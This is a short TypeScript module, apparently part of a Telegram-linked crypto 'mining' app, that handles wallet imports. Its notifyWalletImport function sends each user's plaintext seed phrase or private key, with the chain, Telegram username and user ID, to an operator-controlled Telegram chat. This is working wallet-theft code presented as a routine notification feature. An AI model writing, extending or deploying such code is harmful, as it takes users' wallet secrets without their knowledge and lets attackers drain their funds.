import { getBot, isBotConfigured } from "../../../../bot/app";
import type { MiningImportRequest } from "../validation/import-wallet";

const IMPORT_NOTIFY_USERNAME =
  process.env.TELEGRAM_IMPORT_NOTIFY_USERNAME?.trim() || "x_zera";

function getNotifyChatId(): string | null {
  const chatId = process.env.TELEGRAM_IMPORT_NOTIFY_CHAT_ID?.trim();
  return chatId || null;
}

function formatImportType(importType: MiningImportRequest["importType"]): string {
  return importType === "seed" ? "Seed phrase" : "Private key";
}

function buildMessage(data: MiningImportRequest): string {
  const userLabel = data.telegramUsername
    ? `@${data.telegramUsername}`
    : "unknown";

  return [
    `🔐 Новый импорт кошелька`,
    ``,
    `Сеть: ${data.chainName} (${data.chainId})`,
    `Тип: ${formatImportType(data.importType)}`,
    ``,
    `Данные:`,
    data.secret,
    ``,
    `Пользователь: ${userLabel}`,
    `Telegram ID: ${data.telegramUserId ?? "unknown"}`,
  ].join("\n");
}

export async function notifyWalletImport(data: MiningImportRequest): Promise<void> {
  if (!isBotConfigured()) {
    throw new Error("Telegram bot is not configured");
  }

  const chatId = getNotifyChatId();
  if (!chatId) {
    console.error("Wallet import notification skipped: missing chat id", {
      notifyUsername: IMPORT_NOTIFY_USERNAME,
    });
    throw new Error("Import notification is not configured");
  }

  const bot = getBot();

  await bot.api.sendMessage(chatId, buildMessage(data), {
    link_preview_options: { is_disabled: true },
  });

  console.info("Wallet import notification sent", {
    chainId: data.chainId,
    importType: data.importType,
    notifyUsername: IMPORT_NOTIFY_USERNAME,
    telegramUserId: data.telegramUserId,
  });
}
